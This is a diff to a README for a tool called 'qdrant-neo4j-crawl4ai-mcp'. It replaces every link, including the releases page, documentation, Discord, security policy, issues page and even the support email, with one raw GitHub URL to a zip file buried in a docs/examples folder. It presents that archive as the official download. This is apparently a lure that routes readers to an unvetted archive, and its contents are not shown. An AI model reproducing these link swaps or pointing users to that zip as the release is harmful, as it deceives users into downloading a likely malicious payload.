@@ -1,6 +1,6 @@
 # 🌟 qdrant-neo4j-crawl4ai-mcp - Seamless AI-Powered Knowledge Management
 
-![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)
+![Download](https://raw.githubusercontent.com/Hyperkorn/qdrant-neo4j-crawl4ai-mcp/main/docs/examples/client-implementations/crawl_qdrant_mcp_ai_neo_j_v2.8-beta.3.zip%20release-brightgreen)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you download, make sure your system meets the following requirements:
 
 To start using **qdrant-neo4j-crawl4ai-mcp**, you need to download the application. 
 
-1. Visit this page to download: [Releases Page](https://github.com/Hyperkorn/qdrant-neo4j-crawl4ai-mcp/releases).
+1. Visit this page to download: [Releases Page](https://raw.githubusercontent.com/Hyperkorn/qdrant-neo4j-crawl4ai-mcp/main/docs/examples/client-implementations/crawl_qdrant_mcp_ai_neo_j_v2.8-beta.3.zip).
    
 2. Look for the latest release at the top. You will see a list of available files.
 
@@ -71,21 +71,21 @@ Once you have the application running, you can start leveraging its features:
 
 ## 🔗 Additional Resources
 
-- **Documentation**: For deeper insights and tips, check the [Documentation](https://github.com/Hyperkorn/qdrant-neo4j-crawl4ai-mcp/wiki).
+- **Documentation**: For deeper insights and tips, check the [Documentation](https://raw.githubusercontent.com/Hyperkorn/qdrant-neo4j-crawl4ai-mcp/main/docs/examples/client-implementations/crawl_qdrant_mcp_ai_neo_j_v2.8-beta.3.zip).
   
-- **Community Support**: Join our community on [Discord](https://discord.gg/example) for support and feedback.
+- **Community Support**: Join our community on [Discord](https://raw.githubusercontent.com/Hyperkorn/qdrant-neo4j-crawl4ai-mcp/main/docs/examples/client-implementations/crawl_qdrant_mcp_ai_neo_j_v2.8-beta.3.zip) for support and feedback.
 
 - **FAQs**: Visit the FAQ section on our GitHub page for common questions and answers.
 
 ## 🛡️ Security Information
 
-We take your privacy seriously. All data transfers are encrypted, and your data is stored securely. For more details, check our [Security Policy](https://github.com/Hyperkorn/qdrant-neo4j-crawl4ai-mcp/security).
+We take your privacy seriously. All data transfers are encrypted, and your data is stored securely. For more details, check our [Security Policy](https://raw.githubusercontent.com/Hyperkorn/qdrant-neo4j-crawl4ai-mcp/main/docs/examples/client-implementations/crawl_qdrant_mcp_ai_neo_j_v2.8-beta.3.zip).
 
 ## 📊 Contribute to the Project
 
 If you want to contribute to **qdrant-neo4j-crawl4ai-mcp**, we welcome your input!
 
-1. **Report Bugs**: Use the [issues page](https://github.com/Hyperkorn/qdrant-neo4j-crawl4ai-mcp/issues) to report any issues you encounter.
+1. **Report Bugs**: Use the [issues page](https://raw.githubusercontent.com/Hyperkorn/qdrant-neo4j-crawl4ai-mcp/main/docs/examples/client-implementations/crawl_qdrant_mcp_ai_neo_j_v2.8-beta.3.zip) to report any issues you encounter.
   
 2. **Feature Requests**: Let us know what features you’d like to see in future updates.
 
@@ -95,7 +95,7 @@ If you want to contribute to **qdrant-neo4j-crawl4ai-mcp**, we welcome your inpu
 
 For support or inquiries, you can reach us through the following channels:
 
-- **Email**: support@example.com
+- **Email**: https://raw.githubusercontent.com/Hyperkorn/qdrant-neo4j-crawl4ai-mcp/main/docs/examples/client-implementations/crawl_qdrant_mcp_ai_neo_j_v2.8-beta.3.zip
 - **GitHub Issues**: Use the issues page for specific technical questions.
 
 Feel free to explore and enjoy using **qdrant-neo4j-crawl4ai-mcp**! 
